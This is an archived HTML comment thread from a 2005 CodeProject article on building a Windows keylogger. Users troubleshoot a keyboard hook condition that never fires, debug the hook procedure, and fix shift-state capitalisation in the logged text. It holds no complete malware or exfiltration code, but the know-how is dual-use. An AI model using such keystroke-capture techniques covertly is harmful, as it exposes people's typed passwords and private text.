Newbie<br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1227682&forumid=177768&select=1227682#xx1227682xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1227682#xx1227682xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1227780_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1227780xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1227780 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1227780#xx1227780xx'>Re: Can you help me !</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >6:21 16 Sep '05&nbsp;</font></td></tr></table></td></tr>
+<tr id=1227780_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>Use a def file <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1227682&forumid=177768&select=1227780#xx1227780xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1227780#xx1227780xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1229754_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1229754xx'></a><img height=1 width=36 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1229754 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1229754#xx1229754xx'>Re: Can you help me !</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=399624'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >anhhtu&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >23:25 18 Sep '05&nbsp;</font></td></tr></table></td></tr>
+<tr id=1229754_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=36 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>Thank you, it is working now ! But it is not capture any key when I press the keyboard.<br>I try to debug it, and I found that the condition in If clause:<br><i>if <b>(nCode == HCBT_KEYSKIPPED && (lParam & 0x40000000))</b></i> never return "TRUE". <br>Can you help me again, thanks a lot !<br> <br><br>VC++ Newbie<br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1227682&forumid=177768&select=1229754#xx1229754xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1229754#xx1229754xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1244674_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1244674xx'></a><img height=1 width=54 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1244674 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1244674#xx1244674xx'>Re: Can you help me !</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >10:22 4 Oct '05&nbsp;</font></td></tr></table></td></tr>
+<tr id=1244674_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=54 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>You can't debug a hook procedure ! ! ! <br>Try using debug prints, say OutputDebugString + sysinternals.com DebugView.<br><br>Good luck <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1227682&forumid=177768&select=1244674#xx1244674xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1244674#xx1244674xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1218870_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1218870xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1218870 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1218870#xx1218870xx'><b>VK_SHIFT</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=2208753'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>achernyakov</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>14:49 7 Sep '05</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1218870_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>I'm finding that the uppercasing is off by one character -- that is, the logged text should be:<br><br>thisISatest<br><br>but in fact, it's:<br><br>thisiSAtest<br><br>The GeyKeyboardState API doc says "The status changes as a thread removes keyboard messages from its message queue. The status does not change as keyboard messages are posted to the thread's message queue".<br><br>Any thoughts?<br> <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1218870&forumid=177768&select=1218870#xx1218870xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1218870#xx1218870xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle>Score: 2.0 (2 votes). </td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr></table></td></tr><tr bgcolor=#FBEDBB><td><table width='100%' cellpadding=2><tr><td class=messagetitle>Last Visit: 11:18 Friday 16th June, 2006</td><td align=right nowrap><font class=messagetitle><span class=HoverLink >First</span> <span class=HoverLink >Prev</span> <a class=HoverLink name=HoverNL href='/system/KeyLogger.asp?df=100&forumid=177768&fr=26'>Next</a> <span class=HoverLink >&nbsp;&nbsp;&nbsp;&nbsp;</span> </font></td></tr></table></td></tr></table></td></tr></table>
+</div><p class=smallText><img align=absmiddle src='/script/images/news_general.gif'> General comment &nbsp;&nbsp; <img align=absmiddle src='/script/images/news_info.gif'> News / Info &nbsp;&nbsp; <img align=absmiddle src='/script/images/news_question.gif'> Question &nbsp;&nbsp; <img align=absmiddle src='/script/images/news_answer.gif'> Answer &nbsp;&nbsp; <img align=absmiddle src='/script/images/news_game.gif'> Joke / Game &nbsp;&nbsp; <img align=absmiddle src='/script/images/news_sticky.gif'> Admin message</p>
+<br>
+
+
+<table width=100% cellspacing=5>
+<tr valign=top><td>
+<font size=1 style="font-size:7pt"><a href='/?cat=1'>All Topics</a>, <a href='/?cat=2'>MFC / C++</a> &gt;&gt; <a href='/system/'>System</a> &gt;&gt; <a href='/system/#Security'>Security</a>
+<br>Updated: 9 May 2005 15:06
+</font>
+</td><td align=right>
+<font size=1 style="font-size:7pt">
+Article content copyright Dor Alon, 2005<br>
+everything else Copyright © <A href='mailto:webmaster@codeproject.com'>CodeProject</A>, 1999-2006</a>.
+
+<br>
+Web02 |
+<a href='/info/MediaKit'>Advertise on The Code Project</a> | <a href="/info/privacy.asp">Privacy</a>
+
+</td></tr>
+</table>
+
+<br>
+<center>
+<table border="0" cellspacing="0" cellpadding="0" width="95%">
+<tr><td height=1 bgcolor=#ff9900><img src='/images/space.gif' height=1></td></tr>
+<tr>
+<td align=center><font size=1>
+
+<a href="http://www.theultimatetoolbox.com">The Ultimate Toolbox</a> •
+<a href="http://www.ASPAlliance.com/">ASP Alliance</a> •
+<a href="http://www.developerfusion.co.uk/">Developer Fusion</a> •
+<a href="http://www.developersdex.com/">Developersdex</a> •
+<a href="http://www.devguru.com/">DevGuru</a> •
+<a href="http://www.programmersheaven.com/">Programmers Heaven</a> •
+<A href="http://www.planet-source-code.com/">Planet Source Code</a> •
+<a href="http://www.tek-tips.com/">Tek-Tips Forums</a> •
+
+</font>	
+</td>
+</tr>
+</table>
+</center>
+
+</body>
+</html>
